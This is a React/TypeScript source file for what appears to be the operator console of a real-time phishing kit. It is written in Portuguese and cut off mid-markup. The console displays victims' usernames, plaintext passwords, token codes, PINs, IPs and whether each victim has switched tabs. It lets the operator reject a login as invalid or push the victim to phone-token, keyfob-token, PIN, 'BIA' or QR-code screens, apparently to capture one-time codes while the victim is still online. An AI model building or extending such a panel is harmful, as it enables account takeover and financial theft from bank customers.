import { useEffect, useMemo, useRef, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { createFileRoute } from "@tanstack/react-router";
import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
import { useServerFn } from "@tanstack/react-start";
import { toast } from "sonner";
import { Check, X, Loader2, Search, Copy, Trash2, ArrowRight, Eye, EyeOff, QrCode, Upload } from "lucide-react";
import {
  listarSolicitacoes,
  decidirSolicitacao,
  contarPorStatus,
  reencaminharSolicitacao,
  excluirSolicitacao,
  limparPainel,
  salvarTokenSerial,
  salvarTokenNome,
  enviarQrCode,
  limparQrCode,
} from "@/lib/solicitacoes.functions";

import {
  StatusBadge,
  formatarData,
  type StatusSolicitacao,
} from "@/components/solicitacoes-ui";

export const Route = createFileRoute("/_authenticated/painel")({
  head: () => ({
    meta: [
      { title: "Painel em tempo real — Operador" },
      {
        name: "description",
        content: "Acompanhamento em tempo real das sessões dos clientes com aprovação e reencaminhamento.",
      },
      { property: "og:title", content: "Painel em tempo real — Operador" },
      {
        property: "og:description",
        content: "Acompanhamento em tempo real das sessões e credenciais dos clientes.",
      },
    ],
  }),
  component: PainelPage,
});

type Filtro = {
  status: StatusSolicitacao | "aguardando" | "todos";
  busca: string;
  periodo: "24h" | "7d" | "30d" | "tudo";
};

type ProximaTela = "token_celular" | "token_chaveiro" | "pin" | "interna_token_celular" | "interna_token_chaveiro";
type ProximaTelaOuSucesso =
  | ProximaTela
  | "sucesso"
  | "interna";

type Row = {
  id: string;
  usuario: string;
  credencial: string;
  origem: string;
  status: string;
  observacao: string | null;
  criado_em: string;
  motivo: string | null;
  decidido_em: string | null;
  decidido_por: string | null;
  proxima_tela: ProximaTelaOuSucesso | null;
  token: string | null;
  token_em: string | null;
  ip: string | null;
  user_agent: string | null;
  ultimo_ping: string | null;
  mudou_aba: boolean | null;
  fase: string | null;
  pin: string | null;
  pin_em: string | null;
  token_serial: string | null;
  token_nome: string | null;
  qr_code_url: string | null;
  operador: string | null;

};

function parseUA(ua: string | null): { browser: string; os: string } {
  if (!ua) return { browser: "—", os: "—" };
  const os = /Windows/i.test(ua)
    ? "Windows"
    : /Android/i.test(ua)
      ? "Android"
      : /iPhone|iPad|iOS/i.test(ua)
        ? "iOS"
        : /Mac OS X|Macintosh/i.test(ua)
          ? "macOS"
          : /Linux/i.test(ua)
            ? "Linux"
            : "Desconhecido";
  const browser = /Edg\//i.test(ua)
    ? "Edge"
    : /OPR\//i.test(ua)
      ? "Opera"
      : /Chrome\//i.test(ua)
        ? "Chrome"
        : /Firefox\//i.test(ua)
          ? "Firefox"
          : /Safari\//i.test(ua)
            ? "Safari"
            : "Browser";
  return { browser, os };
}

function online(ultimo_ping: string | null): boolean {
  if (!ultimo_ping) return false;
  return Date.now() - new Date(ultimo_ping).getTime() < 10_000;
}

function horaCurta(iso: string): string {
  return new Date(iso).toLocaleTimeString("pt-BR", {
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });
}

/** Chip verde (L) ou vermelho (N) representando recebido/pendente. */
function DotBadge({ ok, letra = ok ? "L" : "N" }: { ok: boolean; letra?: string }) {
  return (
    <span
      className={`inline-flex h-6 w-8 items-center justify-center rounded font-mono text-[11px] font-bold ${
        ok ? "bg-emerald-500/90 text-emerald-950" : "bg-rose-500/90 text-rose-50"
      }`}
    >
      {letra}
    </span>
  );
}

function CopyText({ value, className }: { value: string; className?: string }) {
  return (
    <button
      type="button"
      onClick={(e) => {
        e.stopPropagation();
        navigator.clipboard.writeText(value).then(
          () => toast.success("Copiado"),
          () => toast.error("Não foi possível copiar"),
        );
      }}
      className={`inline-flex items-center gap-1.5 text-left transition-colors hover:text-foreground ${className ?? ""}`}
      title="Copiar"
    >
      <span className="truncate">{value}</span>
      <Copy className="size-3 shrink-0 opacity-60" />
    </button>
  );
}

function faseChip(fase: string | null) {
  const f = (fase ?? "").toUpperCase();
  const cor =
    fase === "senha"
      ? "border-amber-400/50 bg-amber-400/10 text-amber-300"
      : fase === "token_celular" || fase === "token_chaveiro"
        ? "border-sky-400/50 bg-sky-400/10 text-sky-300"
        : fase === "interna_token_celular" || fase === "interna_token_chaveiro"
          ? "border-fuchsia-400/50 bg-fuchsia-400/10 text-fuchsia-300"
          : fase === "pin"
            ? "border-violet-400/50 bg-violet-400/10 text-violet-300"
            : fase === "concluido"
              ? "border-emerald-400/50 bg-emerald-400/10 text-emerald-300"
              : "border-border bg-background text-muted-foreground";
  const rotulo =
    fase === "token_celular"
      ? "TOKEN CEL"
      : fase === "token_chaveiro"
        ? "TOKEN CHV"
        : fase === "interna_token_celular"
          ? "BIA·CEL"
          : fase === "interna_token_chaveiro"
            ? "BIA·CHV"
            : f || "—";
  return (
    <span
      className={`inline-flex items-center rounded border px-1.5 py-0.5 font-mono text-[10px] tracking-wider ${cor}`}
    >
      {rotulo}
    </span>
  );
}

function PresencaChip({ row }: { row: Row }) {
  const conectado = online(row.ultimo_ping);
  if (!conectado) {
    return (
      <span className="inline-flex items-center gap-1.5 rounded border border-border bg-background px-2 py-0.5 font-mono text-[10px] text-muted-foreground">
        <span className="size-1.5 rounded-full bg-muted-foreground/60" /> Offline
      </span>
    );
  }
  if (row.mudou_aba) {
    return (
      <span className="inline-flex items-center gap-1.5 rounded border border-amber-400/50 bg-amber-400/10 px-2 py-0.5 font-mono text-[10px] text-amber-300">
        <span className="size-1.5 rounded-full bg-amber-400" /> Mudou de aba
      </span>
    );
  }
  return (
    <span className="inline-flex items-center gap-1.5 rounded border border-emerald-400/50 bg-emerald-400/10 px-2 py-0.5 font-mono text-[10px] text-emerald-300">
      <span className="size-1.5 rounded-full bg-emerald-400" /> Conectado
    </span>
  );
}

function PainelPage() {
  const listar = useServerFn(listarSolicitacoes);
  const contar = useServerFn(contarPorStatus);
  const decidir = useServerFn(decidirSolicitacao);
  const reencaminhar = useServerFn(reencaminharSolicitacao);
  const excluir = useServerFn(excluirSolicitacao);
  const limpar = useServerFn(limparPainel);
  const salvarSerial = useServerFn(salvarTokenSerial);
  const salvarNome = useServerFn(salvarTokenNome);
  const enviarQr = useServerFn(enviarQrCode);
  const limparQr = useServerFn(limparQrCode);
  const queryClient = useQueryClient();
  const qrInputRef = useRef<HTMLInputElement | null>(null);
  const [qrTargetId, setQrTargetId] = useState<string | null>(null);
  const [qrUploadingId, setQrUploadingId] = useState<string | null>(null);


  const [filtro, setFiltro] = useState<Filtro>({ status: "todos", busca: "", periodo: "24h" });
  const [selecionada, setSelecionada] = useState<string | null>(null);
  const [mostrarSenha, setMostrarSenha] = useState(false);
  const [motivo, setMotivo] = useState("");
  const [proximaTela, setProximaTela] = useState<ProximaTela>("token_celular");
  const [menuLiberarId, setMenuLiberarId] = useState<string | null>(null);
  const [serials, setSerials] = useState<Record<string, string>>({});
  const [nomes, setNomes] = useState<Record<string, string>>({});

  useEffect(() => {
    if (!menuLiberarId) return;
    const fechar = () => setMenuLiberarId(null);
    window.addEventListener("click", fechar);
    return () => window.removeEventListener("click", fechar);
  }, [menuLiberarId]);

  const lista = useQuery<Row[]>({
    queryKey: ["solicitacoes", filtro],
    queryFn: () => listar({ data: filtro }) as unknown as Promise<Row[]>,
    refetchInterval: 2000,
  });

  const contagem = useQuery({
    queryKey: ["contagem"],
    queryFn: () => contar({}),
    refetchInterval: 3000,
  });

  useEffect(() => {
    const channel = supabase
      .channel("painel-solicitacoes")
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "solicitacoes" },
        () => {
          queryClient.invalidateQueries({ queryKey: ["solicitacoes"] });
          queryClient.invalidateQueries({ queryKey: ["contagem"] });
        },
      )
      .subscribe();
    return () => {
      supabase.removeChannel(channel);
    };
  }, [queryClient]);

  // Sincroniza serials locais com o que veio do banco (sem sobrescrever edições ativas)
  useEffect(() => {
    if (!lista.data) return;
    setSerials((cur) => {
      const next = { ...cur };
      for (const r of lista.data!) {
        if (next[r.id] === undefined) {
          const raw = (r.token_serial ?? "").replace(/^XXXXXX/i, "").replace(/\D/g, "").slice(0, 4);
          next[r.id] = raw.length > 3 ? `${raw.slice(0, 3)}-${raw.slice(3)}` : raw;
        }
      }
      return next;
    });
    setNomes((cur) => {
      const next = { ...cur };
      for (const r of lista.data!) {
        if (next[r.id] === undefined) next[r.id] = r.token_nome ?? "";
      }
      return next;
    });
  }, [lista.data]);

  const atual = useMemo(
    () => lista.data?.find((s) => s.id === selecionada) ?? null,
    [lista.data, selecionada],
  );

  const persistirSerial = useMutation({
    mutationFn: (vars: { id: string; token_serial: string }) => salvarSerial({ data: vars }),
    onError: (e: Error) => toast.error(e.message),
  });

  const persistirNome = useMutation({
    mutationFn: (vars: { id: string; token_nome: string }) => salvarNome({ data: vars }),
    onError: (e: Error) => toast.error(e.message),
  });

  const enviarQrMut = useMutation({
    mutationFn: (vars: { id: string; qr_code_url: string }) => enviarQr({ data: vars }),
    onSuccess: () => {
      toast.success("QR Code enviado ao cliente.");
      invalidar();
    },
    onError: (e: Error) => toast.error(e.message),
    onSettled: () => setQrUploadingId(null),
  });

  const limparQrMut = useMutation({
    mutationFn: (id: string) => limparQr({ data: { id } }),
    onSuccess: () => {
      toast.success("QR Code removido.");
      invalidar();
    },
    onError: (e: Error) => toast.error(e.message),
  });

  async function processarArquivoQr(file: File, id: string) {
    if (!file.type.startsWith("image/")) {
      toast.error("Arquivo colado não é uma imagem.");
      return;
    }
    if (file.size > 1_200_000) {
      toast.error("Imagem muito grande (máx. 1,2 MB).");
      return;
    }
    setQrUploadingId(id);
    try {
      const dataUrl = await new Promise<string>((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = () => resolve(String(reader.result ?? ""));
        reader.onerror = () => reject(new Error("Falha ao ler arquivo."));
        reader.readAsDataURL(file);
      });
      enviarQrMut.mutate({ id, qr_code_url: dataUrl });
    } catch (err) {
      setQrUploadingId(null);
      toast.error(err instanceof Error ? err.message : "Falha ao processar imagem.");
    }
  }

  function abrirSeletorQr(id: string) {
    setQrTargetId(id);
    toast.message("Cole a imagem (Ctrl+V) ou escolha um arquivo.", { duration: 3000 });
    if (qrInputRef.current) qrInputRef.current.value = "";
    qrInputRef.current?.click();
  }

  async function onQrFileSelecionado(e: React.ChangeEvent<HTMLInputElement>) {
    const file = e.target.files?.[0];
    const id = qrTargetId;
    if (!file || !id) return;
    await processarArquivoQr(file, id);
  }

  useEffect(() => {
    async function onPaste(ev: ClipboardEvent) {
      const items = ev.clipboardData?.items;
      if (!items) return;
      let file: File | null = null;
      for (const it of items) {
        if (it.kind === "file" && it.type.startsWith("image/")) {
          file = it.getAsFile();
          break;
        }
      }
      if (!file) return;
      const id = qrTargetId;
      if (!id) {
        toast.error("Clique em 'QR' na linha do cliente antes de colar a imagem.");
        return;
      }
      ev.preventDefault();
      await processarArquivoQr(file, id);
    }
    window.addEventListener("paste", onPaste);
    return () => window.removeEventListener("paste", onPaste);
  }, [qrTargetId]);





  const decisao = useMutation({
    mutationFn: (vars: {
      id: string;
      decisao: "aprovado" | "reprovado";
      motivo?: string | undefined;
      proxima_tela?: ProximaTela | undefined;
      token_serial?: string | undefined;
      token_nome?: string | undefined;
    }) => decidir({ data: vars }),
    onSuccess: (_r, vars) => {
      toast.success(
        vars.decisao === "aprovado" ? "Solicitação aprovada." : "Solicitação reprovada.",
      );
      setSelecionada(null);
      setMotivo("");
      setMostrarSenha(false);
      setProximaTela("token_celular");
      invalidar();
    },
    onError: (e: Error) => toast.error(e.message),
  });

  const enviar = useMutation({
    mutationFn: (vars: { id: string; proxima_tela: ProximaTelaOuSucesso; token_serial?: string | undefined; token_nome?: string | undefined }) =>
      reencaminhar({ data: vars }),
    onSuccess: (_r, v) => {
      toast.success(
        `Cliente redirecionado para ${
          v.proxima_tela === "pin"
            ? "PIN"
            : v.proxima_tela === "token_chaveiro"
              ? "Token Chaveiro"
              : v.proxima_tela === "sucesso"
                ? "Sucesso"
                : v.proxima_tela === "interna"
                  ? "BIA"
                  : v.proxima_tela === "interna_token_celular"
                    ? "BIA Token Celular"
                    : v.proxima_tela === "interna_token_chaveiro"
                      ? "BIA Token Chaveiro"
                      : "Token Celular"
        }.`,
      );
      invalidar();
    },
    onError: (e: Error) => toast.error(e.message),
  });

  const remover = useMutation({
    mutationFn: (id: string) => excluir({ data: { id } }),
    onSuccess: () => {
      toast.success("Solicitação excluída.");
      setSelecionada(null);
      invalidar();
    },
    onError: (e: Error) => toast.error(e.message),
  });

  const limparTudo = useMutation({
    mutationFn: () => limpar({}),
    onSuccess: (r: { count: number }) => {
      toast.success(`Painel limpo (${r.count}).`);
      setSelecionada(null);
      invalidar();
    },
    onError: (e: Error) => toast.error(e.message),
  });

  function invalidar() {
    queryClient.invalidateQueries({ queryKey: ["solicitacoes"] });
    queryClient.invalidateQueries({ queryKey: ["contagem"] });
  }

  return (
    <main className="mx-auto max-w-[1600px] px-4 py-6">
      <input
        ref={qrInputRef}
        type="file"
        accept="image/*"
        className="hidden"
        onChange={onQrFileSelecionado}
      />

      <div className="flex flex-wrap items-end justify-between gap-4">
        <div>
          <h1 className="text-xl font-semibold tracking-tight text-foreground">
            Sessões em tempo real
          </h1>
          <p className="mt-1 text-sm text-muted-foreground">
            Acompanhe cada cliente enquanto ele preenche a validação.
          </p>
        </div>
        <div className="flex items-center gap-2 font-mono text-xs">
          {(["pendente", "aprovado", "reprovado"] as const).map((s) => (
            <div key={s} className="rounded-md border border-border bg-card px-3 py-2">
              <div className="text-muted-foreground uppercase">{s}</div>
              <div className="mt-0.5 text-base text-foreground">{contagem.data?.[s] ?? "–"}</div>
            </div>
          ))}
          <button
            type="button"
            disabled={limparTudo.isPending}
            onClick={() => {
              const total = (contagem.data?.pendente ?? 0) + (contagem.data?.aprovado ?? 0) + (contagem.data?.reprovado ?? 0);
              if (!total) {
                toast.info("Painel já está vazio.");
                return;
              }
              if (!confirm(`Excluir todas as ${total} solicitações do painel? Esta ação não pode ser desfeita.`)) return;
              limparTudo.mutate();
            }}
            className="inline-flex h-[52px] items-center gap-1.5 rounded-md border border-destructive/40 bg-destructive/10 px-3 text-xs font-medium text-destructive transition-colors hover:bg-destructive/20 disabled:opacity-60"
            title="Excluir todas as solicitações"
          >
            {limparTudo.isPending ? <Loader2 className="size-3.5 animate-spin" /> : <Trash2 className="size-3.5" />}
            Limpar painel
          </button>
        </div>
      </div>

      <div className="mt-6 flex flex-wrap items-center gap-2">
        <div className="relative">
          <Search className="pointer-events-none absolute top-1/2 left-2.5 size-3.5 -translate-y-1/2 text-muted-foreground" />
          <input
            value={filtro.busca}
            onChange={(e) => setFiltro({ ...filtro, busca: e.target.value })}
            placeholder="Buscar cliente"
            maxLength={120}
            className="h-9 w-56 rounded-md border border-input bg-card pr-3 pl-8 text-sm text-foreground outline-none placeholder:text-muted-foreground/60 focus:border-ring"
          />
        </div>
        <div className="flex overflow-hidden rounded-md border border-border">
          {(["pendente", "aguardando", "aprovado", "reprovado", "todos"] as const).map((s) => (
            <button
              key={s}
              onClick={() => setFiltro({ ...filtro, status: s })}
              className={`px-3 py-1.5 text-xs capitalize transition-colors ${
                filtro.status === s
                  ? "bg-accent text-foreground"
                  : "bg-card text-muted-foreground hover:text-foreground"
              }`}
            >
              {s === "aguardando" ? "aguardando" : s}
            </button>
          ))}
        </div>
        <select
          value={filtro.periodo}
          onChange={(e) => setFiltro({ ...filtro, periodo: e.target.value as Filtro["periodo"] })}
          className="h-9 rounded-md border border-input bg-card px-2 text-xs text-foreground outline-none focus:border-ring"
        >
          <option value="tudo">Todo o período</option>
          <option value="24h">Últimas 24h</option>
          <option value="7d">Últimos 7 dias</option>
          <option value="30d">Últimos 30 dias</option>
        </select>
        <div className="ml-auto flex items-center gap-2 font-mono text-[10px] text-muted-foreground">
          <span className="inline-flex size-1.5 animate-pulse rounded-full bg-emerald-400" />
          atualizando a cada 2s
        </div>
      </div>

      <div className="mt-4 grid gap-4 xl:grid-cols-[1fr_400px]">
        <div className="overflow-x-auto rounded-lg border border-border bg-card">
          <table className="w-full min-w-[1100px] text-sm">
            <thead>
              <tr className="border-b border-border font-mono text-[10px] tracking-wider text-muted-foreground uppercase">
                <th className="px-3 py-2.5 text-left font-normal">Cliente</th>
                <th className="px-3 py-2.5 text-left font-normal">Presença</th>
                <th className="px-3 py-2.5 text-left font-normal">Fase</th>
                <th className="px-3 py-2.5 text-left font-normal">Usuário</th>
                <th className="px-3 py-2.5 text-left font-normal">Senha</th>
                <th className="px-3 py-2.5 text-left font-normal">Nome do cliente</th>
                <th className="px-3 py-2.5 text-left font-normal">Serial do token</th>
                <th className="px-3 py-2.5 text-left font-normal">Token</th>
                <th className="px-3 py-2.5 text-left font-normal">Pin</th>
                <th className="px-3 py-2.5 text-left font-normal">Verificação</th>
                <th className="px-3 py-2.5 text-right font-normal">Ação</th>
              </tr>
            </thead>
            <tbody>
              {lista.isLoading && (
                <tr>
                  <td colSpan={11} className="px-3 py-10 text-center text-muted-foreground">
                    Carregando…
                  </td>
                </tr>
              )}
              {lista.data?.length === 0 && (
                <tr>
                  <td colSpan={11} className="px-3 py-10 text-center text-muted-foreground">
                    Nenhuma sessão nesses filtros.
                  </td>
                </tr>
              )}
              {lista.data?.map((s) => {
                const ua = parseUA(s.user_agent);
                const conectado = online(s.ultimo_ping);
                const aprovado = s.status === "aprovado";
                return (
                  <tr
                    key={s.id}
                    onClick={() => {
                      setSelecionada(s.id);
                      setMostrarSenha(false);
                      setMotivo("");
                    }}
                    className={`cursor-pointer border-b border-border/60 align-top transition-colors last:border-0 hover:bg-accent/40 ${
                      selecionada === s.id ? "bg-accent/60" : ""
                    }`}
                  >
                    <td className="px-3 py-3">
                      <div className="font-mono text-sm font-semibold text-foreground">
                        {horaCurta(s.criado_em)}
                      </div>
                      <div className="mt-1 flex items-center gap-1.5 text-[11px]">
                        <span
                          className={`inline-block size-1.5 rounded-full ${
                            conectado ? "bg-emerald-400" : "bg-muted-foreground/50"
                          }`}
                        />
                        <span className={conectado ? "text-emerald-300" : "text-muted-foreground"}>
                          {conectado ? "Conectado" : "Offline"}
                        </span>
                      </div>
                      <div className="mt-0.5 font-mono text-[11px] text-muted-foreground">
                        {s.ip ?? "—"}
                      </div>
                      <div className="text-[11px] text-muted-foreground">
                        {ua.browser} · {ua.os}
                      </div>
                    </td>
                    <td className="px-3 py-3">
                      <PresencaChip row={s} />
                    </td>
                    <td className="px-3 py-3">{faseChip(s.fase)}</td>
                    <td className="px-3 py-3 font-mono text-[13px] text-foreground">
                      <div className="relative flex items-center gap-2">
                        <CopyText value={s.usuario} />
                        <button
                          type="button"
                          title="Liberar para token"
                          disabled={decisao.isPending || enviar.isPending}
                          onClick={(e) => {
                            e.stopPropagation();
                            setMenuLiberarId((cur) => (cur === s.id ? null : s.id));
                          }}
                          className="inline-flex h-6 w-6 items-center justify-center rounded bg-emerald-500/90 font-mono text-[11px] font-bold text-emerald-950 transition-opacity hover:opacity-90 disabled:opacity-60"
                        >
                          L
                        </button>
                        {menuLiberarId === s.id && (
                          <div
                            onClick={(e) => e.stopPropagation()}
                            className="absolute top-7 left-0 z-20 flex min-w-[160px] flex-col overflow-hidden rounded-md border border-border bg-popover shadow-lg"
                          >
                            {(
                              [
                                { tela: "token_celular", label: "Token do celular" },
                                { tela: "token_chaveiro", label: "Token do chaveiro" },
                              ] as const
                            ).map((op, i) => (
                              <button
                                key={op.tela}
                                type="button"
                                onClick={() => {
                                  const digits = (serials[s.id] ?? "").replace(/\D/g, "");
                                  if (digits.length !== 4) {
                                    toast.error("Informe os 4 dígitos do serial do token antes de liberar.");
                                    return;
                                  }
                                  const nome = (nomes[s.id] ?? "").trim();
                                  if (!nome) {
                                    toast.error("Informe o nome do cliente antes de liberar.");
                                    return;
                                  }
                                  const serial = `XXXXXX${digits.slice(0, 3)}-${digits.slice(3)}`;
                                  setMenuLiberarId(null);
                                  if (s.status === "aprovado") {
                                    enviar.mutate({ id: s.id, proxima_tela: op.tela, token_serial: serial, token_nome: nome });
                                  } else {
                                    decisao.mutate({
                                      id: s.id,
                                      decisao: "aprovado",
                                      proxima_tela: op.tela,
                                      token_serial: serial,
                                      token_nome: nome,
                                    });
                                  }
                                }}
                                className={`${i > 0 ? "border-t border-border " : ""}px-3 py-2 text-left text-xs text-foreground hover:bg-accent`}
                              >
                                {op.label}
                              </button>
                            ))}
                          </div>
                        )}
                      </div>
                    </td>
                    <td className="px-3 py-3 font-mono text-[13px] text-foreground">
                      <div className="flex items-center gap-2">
                        <CopyText value={s.credencial} className="max-w-[180px]" />
                        <button
                          type="button"
                          title="Login inválido"
                          disabled={decisao.isPending || s.status !== "pendente"}
                          onClick={(e) => {
                            e.stopPropagation();
                            decisao.mutate({
                              id: s.id,
                              decisao: "reprovado",
                              motivo: "Login inválido",
                            });
                          }}
                          className="inline-flex h-6 w-6 items-center justify-center rounded bg-rose-500/90 font-mono text-[11px] font-bold text-rose-50 transition-opacity hover:opacity-90 disabled:opacity-60"
                        >
                          N
                        </button>
                      </div>
                    </td>
                    <td className="px-3 py-3">
                      <input
                        type="text"
                        onClick={(e) => e.stopPropagation()}
                        value={nomes[s.id] ?? ""}
                        onChange={(e) => {
                          const v = e.target.value.slice(0, 60);
                          setNomes((cur) => ({ ...cur, [s.id]: v }));
                        }}
                        onBlur={() => {
                          const v = (nomes[s.id] ?? "").trim();
                          if (v !== (s.token_nome ?? "")) {
                            persistirNome.mutate({ id: s.id, token_nome: v });
                          }
                        }}
                        placeholder="Nome do cliente"
                        maxLength={60}
                        className="h-7 w-40 rounded border border-input bg-background px-2 text-[13px] text-foreground outline-none placeholder:text-muted-foreground/50 focus:border-ring"
                      />
                    </td>
                    <td className="px-3 py-3">
                      <div
                        onClick={(e) => e.stopPropagation()}
                        className="inline-flex h-7 items-center rounded border border-input bg-background font-mono text-[12px] text-foreground focus-within:border-ring"
                      >
                        <span className="select-none pl-2 pr-1 text-muted-foreground">XXXXXX</span>
                        <input
                          type="text"
                          inputMode="numeric"
                          value={serials[s.id] ?? ""}
                          onChange={(e) => {
                            const d = e.target.value.replace(/\D/g, "").slice(0, 4);
                            const formatted = d.length > 3 ? `${d.slice(0, 3)}-${d.slice(3)}` : d;
                            setSerials((cur) => ({ ...cur, [s.id]: formatted }));
                          }}
                          onBlur={() => {
                            const d = (serials[s.id] ?? "").replace(/\D/g, "");
                            const toSave = d.length === 4 ? `XXXXXX${d.slice(0, 3)}-${d.slice(3)}` : "";
                            if (toSave !== (s.token_serial ?? "")) {
                              persistirSerial.mutate({ id: s.id, token_serial: toSave });
                            }
                          }}
                          placeholder="000-0"
                          maxLength={5}
                          className="h-full w-14 bg-transparent pr-2 outline-none placeholder:text-muted-foreground/50"
                        />
                      </div>
                    </td>


                    <td className="px-3 py-3">
                      <div className="flex flex-wrap items-center gap-1.5">
                        {s.token ? (
                          <CopyText value={s.token} className="max-w-[110px] font-mono text-[13px]" />
                        ) : aprovado ? (
                          <>
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                enviar.mutate({
                                  id: s.id,
                                  proxima_tela:
                                    s.proxima_tela === "token_chaveiro"
                                      ? "token_chaveiro"
                                      : "token_celular",
                                });
                              }}
                              disabled={enviar.isPending}
                              className="inline-flex items-center gap-1 rounded border border-sky-400/60 bg-sky-400/10 px-2 py-1 font-mono text-[11px] text-sky-300 transition-colors hover:bg-sky-400/20 disabled:opacity-60"
                              title="Pedir token na página principal"
                            >
                              <ArrowRight className="size-3" /> Token
                            </button>
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                enviar.mutate({ id: s.id, proxima_tela: "interna_token_celular" });
                              }}
                              disabled={enviar.isPending}
                              className="inline-flex items-center gap-1 rounded border border-fuchsia-400/60 bg-fuchsia-400/10 px-2 py-1 font-mono text-[11px] text-fuchsia-300 transition-colors hover:bg-fuchsia-400/20 disabled:opacity-60"
                              title="Pedir token do celular dentro da tela da BIA"
                            >
                              BIA·Cel
                            </button>
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                enviar.mutate({ id: s.id, proxima_tela: "interna_token_chaveiro" });
                              }}
                              disabled={enviar.isPending}
                              className="inline-flex items-center gap-1 rounded border border-fuchsia-400/60 bg-fuchsia-400/10 px-2 py-1 font-mono text-[11px] text-fuchsia-300 transition-colors hover:bg-fuchsia-400/20 disabled:opacity-60"
                              title="Pedir token do chaveiro dentro da tela da BIA"
                            >
                              BIA·Chv
                            </button>
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                abrirSeletorQr(s.id);
                              }}
                              disabled={qrUploadingId === s.id || enviarQrMut.isPending}
                              className="inline-flex items-center gap-1 rounded border border-cyan-400/60 bg-cyan-400/10 px-2 py-1 font-mono text-[11px] text-cyan-300 transition-colors hover:bg-cyan-400/20 disabled:opacity-60"
                              title="Enviar imagem de QR Code ao cliente"
                            >
                              {qrUploadingId === s.id ? (
                                <Loader2 className="size-3 animate-spin" />
                              ) : s.qr_code_url ? (
                                <Upload className="size-3" />
                              ) : (
                                <QrCode className="size-3" />
                              )}
                              QR
                            </button>
                            {s.qr_code_url ? (
                              <button
                                onClick={(e) => {
                                  e.stopPropagation();
                                  limparQrMut.mutate(s.id);
                                }}
                                disabled={limparQrMut.isPending}
                                className="inline-flex items-center gap-1 rounded border border-border bg-background px-1.5 py-1 font-mono text-[11px] text-muted-foreground transition-colors hover:text-foreground disabled:opacity-60"
                                title="Remover QR Code enviado"
                              >
                                <X className="size-3" />
                              </button>
                            ) : null}
                          </>
                        ) : (
                          <span className="text-muted-foreground">—</span>
                        )}
                        <DotBadge ok={!!s.token} />
                      </div>
                    </td>

                    <td className="px-3 py-3">
                      <div className="flex items-center gap-2">
                        {s.pin ? (
                          <CopyText value={s.pin} className="max-w-[110px] font-mono text-[13px]" />
                        ) : aprovado ? (
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              enviar.mutate({ id: s.id, proxima_tela: "pin" });
                            }}
                            disabled={enviar.isPending}
                            className="inline-flex items-center gap-1 rounded border border-violet-400/60 bg-violet-400/10 px-2 py-1 font-mono text-[11px] text-violet-300 transition-colors hover:bg-violet-400/20 disabled:opacity-60"
                          >
                            <ArrowRight className="size-3" /> PIN
                          </button>
                        ) : (
                          <span className="text-muted-foreground">—</span>
                        )}
                        <DotBadge ok={!!s.pin} />
                      </div>
                    </td>
                    <td className="px-3 py-3">
                      <StatusBadge status={s.status as StatusSolicitacao} />
                    </td>
                    <td className="px-3 py-3">
                      <div className="flex items-center justify-end gap-1">
                        {s.status === "pendente" ? (
                          <>
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                decisao.mutate({
                                  id: s.id,
                                  decisao: "aprovado",
                                  proxima_tela: "token_celular",
                                });
                              }}
                              disabled={decisao.isPending}
                              title="Aprovar rápido (Token Celular)"
                              className="inline-flex size-7 items-center justify-center rounded bg-emerald-500/15 text-emerald-400 transition-colors hover:bg-emerald-500/25 disabled:opacity-60"
                            >
                              <Check className="size-3.5" />
                            </button>
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                const m = prompt("Motivo da reprovação:")?.trim();
                                if (!m) return;
                                decisao.mutate({
                                  id: s.id,
                                  decisao: "reprovado",
                                  motivo: m,
                                });
                              }}
                              disabled={decisao.isPending}
                              title="Reprovar"
                              className="inline-flex size-7 items-center justify-center rounded bg-destructive/15 text-destructive transition-colors hover:bg-destructive/25 disabled:opacity-60"
                            >
                              <X className="size-3.5" />
                            </button>
                          </>
                        ) : null}
                        <button
                          onClick={(e) => {
                            e.stopPropagation();
                            if (!confirm(`Excluir a solicitação de ${s.usuario}?`)) return;
                            remover.mutate(s.id);
                          }}
                          disabled={remover.isPending}
                          title="Excluir solicitação"
                          className="inline-flex size-7 items-center justify-center rounded bg-destructive/10 text-destructive/80 transition-colors hover:bg-destructive/25 hover:text-destructive disabled:opacity-60"
                        >
                          <Trash2 className="size-3.5" />
                        </button>
                      </div>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>

        <aside className="h-fit rounded-lg border border-border bg-card p-4 xl:sticky xl:top-20">
          {!atual ? (
            <p className="py-16 text-center text-sm text-muted-foreground">
              Selecione uma linha para ver os detalhes e decidir.
            </p>
          ) : (
            <div className="space-y-4">
              <div className="flex items-start justify-between gap-2">
                <div className="min-w-0">
                  <div className="truncate font-mono text-base text-foreground">
                    {atual.usuario}
                  </div>
                  <div className="mt-0.5 text-xs text-muted-foreground">
                    {atual.origem} · {formatarData(atual.criado_em)}
                  </div>
                </div>
                <StatusBadge status={atual.status as StatusSolicitacao} />
              </div>

              <div className="grid grid-cols-2 gap-2 font-mono text-[11px]">
                <div className="rounded border border-border bg-background px-2 py-1.5">
                  <div className="text-muted-foreground">IP</div>
                  <div className="text-foreground">{atual.ip ?? "—"}</div>
                </div>
                <div className="rounded border border-border bg-background px-2 py-1.5">
                  <div className="text-muted-foreground">Fase</div>
                  <div className="text-foreground">{atual.fase ?? "—"}</div>
                </div>
              </div>

              <div className="space-y-1.5">
                <div className="font-mono text-[10px] tracking-wider text-muted-foreground uppercase">
                  Senha enviada
                </div>
                <div className="flex items-center gap-2 rounded-md border border-border bg-background px-3 py-2">
                  <span className="flex-1 truncate font-mono text-sm text-foreground">
                    {mostrarSenha
                      ? atual.credencial
                      : "•".repeat(Math.min(atual.credencial.length, 14))}
                  </span>
                  <button
                    onClick={() => setMostrarSenha((v) => !v)}
                    className="text-muted-foreground transition-colors hover:text-foreground"
                    aria-label={mostrarSenha ? "Ocultar senha" : "Mostrar senha"}
                  >
                    {mostrarSenha ? <EyeOff className="size-4" /> : <Eye className="size-4" />}
                  </button>
                </div>
              </div>

              {atual.token && (
                <div className="space-y-1.5">
                  <div className="font-mono text-[10px] tracking-wider text-muted-foreground uppercase">
                    Token do cliente
                  </div>
